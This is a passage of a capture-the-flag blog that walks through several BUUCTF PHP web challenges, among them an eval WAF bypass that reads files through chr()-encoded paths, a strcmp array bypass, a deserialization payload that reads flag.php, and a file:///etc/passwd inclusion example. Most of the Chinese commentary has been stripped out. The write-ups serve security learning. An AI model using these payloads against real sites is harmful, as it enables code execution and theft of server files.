file</strong><strong></strong></p><blockquote><p><br>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p></blockquote><p>dirsearch<br><img src="https://img-blog.csdnimg.cn/9acc437c03744836b70d8748bf4d6199.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/78f243565bdf4940bebebe089d87d9a0.png" alt="2"><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br><img src="https://img-blog.csdnimg.cn/af49efe60a034006a4f3db1994dacea2.png" alt="3"><br>flag<code>flag&#123;d21c38ea-d364-4047-a47c-4527c09a3937&#125; </code></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/7dbc9a95029643b6ac0fbaa2bc5acc41.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/67df4dfceb3343c0b3ab1ee039933a14.png" alt="1"><br>url<code>calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val())</code></p><blockquote><p>$(#content).val() <br>idcontentHTML,JQuery, $(#content)document.getElementById(content); $(#content).val() document.getElementById(content).value;</p></blockquote><p>calc.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>http://node4.buuoj.cn:28863/calc.php?num=1</code><br><br><code>http://node4.buuoj.cn:28863/calc.php?num=a</code><br><br><img src="https://img-blog.csdnimg.cn/beaf25ecc9db463c87bdc14b7f82bd47.png" alt="2"><br>flag<br>WAF<a href="https://blog.csdn.net/qq_45521281/article/details/105871192">PHPWaf</a></p><blockquote><p>PHP</p><p>1.<br>2.</p></blockquote><p>numnumwafwafnumwaf numphp num<br><code>print_r(scandir(&#39;/&#39;))c</code><br>calc.php<code>&quot;``&#39;</code>ASCII</p><p><code>http://node4.buuoj.cn:28863/calc.php? num=print_r(scandir(chr(47)))</code><br><img src="https://img-blog.csdnimg.cn/48e5899d3e6f42f497fdd879518a8090.png" alt="4"><br>flagf1agg<br>ASCII<br><code>http://node4.buuoj.cn:28863/calc.php? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code><br>flag.<br><strong>flag{c7fa0f73-f1a2-4d7c-b3bb-ea6c6da4697c}</strong></p><h2 id="-2019-BuyFlag"><a href="#-2019-BuyFlag" class="headerlink" title="[ 2019]BuyFlag"></a>[ 2019]BuyFlag</h2><p><img src="https://img-blog.csdnimg.cn/2d6553026ec84e11a2b51bc17eff592e.png" alt="1"><img src="https://img-blog.csdnimg.cn/282f01c25350408ebbe4e522ade24a94.png" alt="5"></p><p><img src="https://img-blog.csdnimg.cn/d46d326609cb44ba90c146463434cf9b.png" alt="2"><br>cookie<br><img src="https://img-blog.csdnimg.cn/19e411b9ed5d45e4a654dc8ab5c55c5b.png" alt="3"><br>01<br><img src="https://img-blog.csdnimg.cn/72e319f95be24bedbac48dce902169b1.png" alt="5"><br><br><img src="https://img-blog.csdnimg.cn/0a9b22d22ae943a6a0a262c6586a4189.png" alt="6"><strong>&#x3D;&#x3D;<strong>post<br><img src="https://img-blog.csdnimg.cn/85f4ea6e2307467993ae5c0da4f24a12.png" alt="7"><br>1e9<br><img src="https://img-blog.csdnimg.cn/a233cb5e10da40559fb2e04d30af20a2.png" alt="8"><br></strong>password&#x3D;404jk&amp;money[]&#x3D;1000000000;</strong><a href="https://blog.csdn.net/cherrie007/article/details/77473817">strcmp</a></p><h2 id="-2020--AreUSerialzphp"><a href="#-2020--AreUSerialzphp" class="headerlink" title="[ 2020 ]AreUSerialzphp"></a>[ 2020 ]AreUSerialzphp</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>  <span class="token comment">//protected: </span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>__construct()</strong></p><blockquote><p>constructor method new </p></blockquote><p><strong>__destruct</strong></p><blockquote><p>__destruct() &#x2F;&#x2F;</p><p>__destruct()  PHP <br></p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>  <span class="token comment">//protected: </span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filename<strong>flag.php</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ASCII32~125</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>op<strong></strong></p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//op1</span>           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//op2</span>           <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>op<strong></strong>flagop&#x3D;2php7.1++public</p></blockquote><p>?**$op&#x3D;2**</p><blockquote><p>op &#x3D;&#x3D;&#x3D; 2op &#x3D;&#x3D; 2op &#x3D;&#x3D;&#x3D; 2,__destruct()read</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>  <span class="token comment">//protected: </span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$b</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/364916f0203944bda37d24a09796566b.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/f495a0667a374112af7a7e1de5d21e5a.png" alt="2"><br>flag</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFphp</title>
      <link href="/2022/12/29/CTF%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
      <url>/2022/12/29/CTF%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id=""><a href="#" class="headerlink" title=""></a></h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">php<span class="token punctuation">:</span><span class="token operator">//</span>  <span class="token operator">/</span>I<span class="token operator">/</span>O streams<span class="token builtin">file</span><span class="token punctuation">:</span><span class="token operator">//</span>  phar<span class="token punctuation">:</span><span class="token operator">//</span>  PHP zlib<span class="token punctuation">:</span><span class="token operator">//</span>  data<span class="token punctuation">:</span><span class="token operator">//</span>  RFC <span class="token number">2397</span>http<span class="token punctuation">:</span><span class="token operator">//</span>   HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> ftp<span class="token punctuation">:</span><span class="token operator">//</span>   FTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> URLsglob<span class="token punctuation">:</span><span class="token operator">//</span>  ssh2<span class="token punctuation">:</span><span class="token operator">//</span>  Secure Shell <span class="token number">2</span>rar<span class="token punctuation">:</span><span class="token operator">//</span>  RARogg<span class="token punctuation">:</span><span class="token operator">//</span>  expect<span class="token punctuation">:</span><span class="token operator">//</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p><code>allow_url_fopen</code><code>allow_url_include</code><br> <code>file://</code>()<br> <code>http://www.xx.com?file=file:///etc/passsword</code></p><h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p><code>allow_url_fopen</code><code>allow_url_include</code><br> <code>php://</code></p><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" 